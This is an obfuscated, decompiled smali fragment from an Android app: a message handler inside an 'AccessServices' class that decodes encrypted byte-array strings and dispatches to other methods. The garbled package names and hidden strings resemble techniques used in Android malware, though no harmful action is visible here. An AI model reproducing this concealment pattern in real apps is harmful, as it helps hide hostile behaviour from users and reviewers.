.class Lcom/icontrol/protector/AccessServices$j;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/os/Handler$Callback;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/icontrol/protector/AccessServices;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/icontrol/protector/AccessServices;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/AccessServices;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/AccessServices$j;->a:Lcom/icontrol/protector/AccessServices;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public handleMessage(Landroid/os/Message;)Z
    .locals 2

    iget v0, p1, Landroid/os/Message;->arg1:I

    iget p1, p1, Landroid/os/Message;->what:I

    const/16 v0, 0xf

    if-eq p1, v0, :cond_0

    const/16 v0, 0x8

    const/4 v1, 0x3

    packed-switch p1, :pswitch_data_0

    goto :goto_1

    :pswitch_0
    iget-object p1, p0, Lcom/icontrol/protector/AccessServices$j;->a:Lcom/icontrol/protector/AccessServices;

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    invoke-static {v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    :goto_0
    invoke-static {p1, v0}, Lcom/icontrol/protector/u;->d(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)V

    goto :goto_1

    :pswitch_1
    iget-object p1, p0, Lcom/icontrol/protector/AccessServices$j;->a:Lcom/icontrol/protector/AccessServices;

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    invoke-static {v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :pswitch_2
    iget-object p1, p0, Lcom/icontrol/protector/AccessServices$j;->a:Lcom/icontrol/protector/AccessServices;

    invoke-static {p1}, Lcom/icontrol/protector/l;->j(Lcom/icontrol/protector/AccessServices;)V

    goto :goto_1

    :pswitch_3
    iget-object p1, p0, Lcom/icontrol/protector/AccessServices$j;->a:Lcom/icontrol/protector/AccessServices;

    invoke-static {p1}, Lcom/icontrol/protector/l;->i(Lcom/icontrol/protector/AccessServices;)V

    goto :goto_1

    :cond_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v6;->i()V

    :goto_1
    const/4 p1, 0x0

    return p1

    nop

    :pswitch_data_0
    .packed-switch 0x321
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :array_0
    .array-data 1
        -0x78t
        -0x7t
        -0x5bt
    .end array-data

    :array_1
    .array-data 1
        -0x1t
        -0x64t
        -0x3at
        -0x7ft
        -0x67t
        -0x11t
        -0x29t
        0x5dt
    .end array-data

    :array_2
    .array-data 1
        0x32t
        -0x6et
        -0x3bt
    .end array-data

    :array_3
    .array-data 1
        0x53t
        -0x2t
        -0x54t
        -0x64t
        -0x77t
        0x12t
        0x57t
        -0x42t
    .end array-data
.end method
